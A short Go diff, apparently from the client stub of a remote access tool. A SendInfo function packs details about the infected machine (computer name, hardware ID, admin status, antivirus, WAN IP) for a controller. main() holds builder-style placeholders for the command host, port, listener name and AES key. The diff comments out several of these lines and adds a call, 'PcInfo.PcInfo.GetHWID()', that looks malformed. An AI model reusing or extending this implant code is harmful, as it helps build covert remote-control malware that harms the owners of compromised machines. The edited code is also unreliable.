@@ -51,14 +51,14 @@ func SendInfo() []byte {
 	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
 	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
 
-	msgpack.ForcePathObject("Path").SetAsString("")
+	//msgpack.ForcePathObject("Path").SetAsString("")
 	msgpack.ForcePathObject("Admin").SetAsString("")
-	msgpack.ForcePathObject("AV").SetAsString("NULL")
+	//msgpack.ForcePathObject("AV").SetAsString("NULL")
 	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
 	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
 	//println(string(msgpack.Encode2Bytes()))
-	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
+	//msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
 	return msgpack.Encode2Bytes()
 }
 
@@ -158,14 +158,15 @@ var ClientWorking bool
 func main() {
 
 	//release
-	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
-	Port := "PortAAAABBBBCCCCDDDD"
-	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	route := "RouteAAAABBBBCCCCDDDD"
-	PcInfo.AesKey = "AeskAAAABBBBCCCC"
-	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	// Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
+	// Port := "PortAAAABBBBCCCCDDDD"
+	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	// route := "RouteAAAABBBBCCCCDDDD"
+	// PcInfo.AesKey = "AeskAAAABBBBCCCC"
+	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	//PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	PcInfo.PcInfo.GetHWID()
 	PcInfo.ClientComputer = GetClientComputer()
 	///Debug
 	// Host := "192.168.1.4"
